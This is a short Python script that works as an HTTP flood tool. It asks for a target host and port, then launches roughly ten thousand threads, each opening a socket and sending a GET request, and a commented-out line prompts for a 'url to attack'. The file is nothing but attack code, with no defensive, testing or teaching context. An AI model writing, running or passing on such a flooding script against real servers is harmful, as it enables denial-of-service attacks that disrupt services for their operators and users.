import requests as re

import socket as s
import threading as th

#url = raw_input("Enter url to attack: ")
#r = re.get(url, verify = False)

class HTTPF (th.Thread):
	def __init__(self,host,port):
		th.Thread.__init__(self)
		self.host = host
		self.port = port
	def run(self):
		try:
			client = s.socket(s.AF_INET,s.SOCK_STREAM)
	        	client.connect((self.host,self.port))
	        	request = "GET / HTTP/1.1\r\nHost:{}\r\n\r\n".format(self.host)
	       		client.send(request.encode())
			print("Sent to {}".format(s.gethostbyname(self.host)))
		except s.error as msg:
			print("Error {}".format(msg))
def act():
	host = raw_input("Enter Host: ")
	port = int(raw_input("Enter Port: "))
	for i in range(1,10000):
		HTTP = HTTPF(host,port)
		HTTP.start()

act()
